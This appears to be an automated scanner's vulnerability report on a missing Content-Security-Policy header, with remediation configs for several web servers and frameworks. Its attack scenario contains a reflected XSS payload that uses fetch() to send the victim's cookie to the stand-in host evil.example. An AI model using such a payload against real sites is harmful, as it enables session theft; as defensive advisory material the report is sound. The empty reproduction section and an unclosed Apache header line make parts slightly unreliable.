# WPOC-53C1BC: Missing Content-Security-Policy Header

**Severity:** MEDIUM  
**Confidence:** HIGH  
**Status:** CONFIRMED  

**Affected endpoint:** `GET http://127.0.0.1/`
**Parameter:** `content-security-policy`
**Input used:** `(not set)`

## Summary

The Content-Security-Policy header is absent, leaving the application without a server-side policy that defines which scripts, styles, images, frames, and connections the browser should trust. Without CSP, any XSS bug becomes immediately exploitable and the blast radius of a single injection grows.

## Technical explanation

Content-Security-Policy is a defense-in-depth header that whitelists the origins from which resources can be loaded and inline content that can execute. Modern browsers enforce CSP at parse time: a script tag whose source does not match the policy is blocked before it runs. CSP cannot fix an XSS bug, but it raises the cost of exploitation by forcing an attacker to either find a JSONP endpoint, abuse an allowed CDN, or compromise an allowed origin. Absent CSP, every stored, reflected, or DOM-based XSS sinks directly into the user's session.

## Attack scenario

1. Attacker discovers a reflected XSS in https://target.example/search?q=
2. Attacker crafts a link `https://target.example/search?q=<script>fetch('//evil.example/?c='+document.cookie)</script>`
3. Attacker distributes the link via email, Slack, or social media
4. Victim clicks the link while authenticated to target.example
5. With CSP absent, the inline <script> executes and exfiltrates the session cookie to evil.example
6. Attacker replays the cookie and impersonates the victim
7. With a strict CSP (e.g. `script-src 'self'`) the inline script is blocked at parse time and the attack fails

## Steps to reproduce


## Impact

Without CSP every XSS vulnerability is a direct credential theft or account takeover vector. CSP also limits the impact of clickjacking (via `frame-ancestors`), mixed-content issues (via `block-all-mixed-content`), and unauthorized iframe embedding. Absence of CSP increases the severity of any other client-side vulnerability and is a meaningful compliance gap (PCI-DSS, NIST 800-53 SC-18).

## Evidence

_1 evidence record(s). See `evidence/WPOC-53C1BC-*.txt` in the report directory._

## Remediation

1. Add a strict CSP starting with `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'`.
2. Avoid `unsafe-inline` and `unsafe-eval` — they disable the primary XSS-mitigation benefit of CSP. If you must allow inline scripts, switch to nonces or hashes (`script-src 'nonce-{random}'`).
3. Deploy in Report-Only mode first (`Content-Security-Policy-Report-Only`) to collect violations before enforcing.
4. Use `report-uri` or `report-to` to send violation reports to a logging endpoint for monitoring.

## Code examples

### nginx

```
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'" always;
```

### apache

```
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'
```

### express

```
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameAncestors: ["'none'"],
  }
}));
```

### flask

```
from flask_talisman import Talisman
Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': "'self'",
    'object-src': "'none'",
    'frame-ancestors': "'none'"
})
```

### django

```
# settings.py
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_OBJECT_SRC = ("'none'",)
CSP_FRAME_ANCESTORS = ("'none'",)
# install django-csp and add its middleware
```

## References

- CWE-1021 (https://cwe.mitre.org/data/definitions/1021.html)
- OWASP A05:2021

---
*Discovered: 2026-08-31T22:06:59.585054+00:00*  
*Tool: redveil v0.1.0*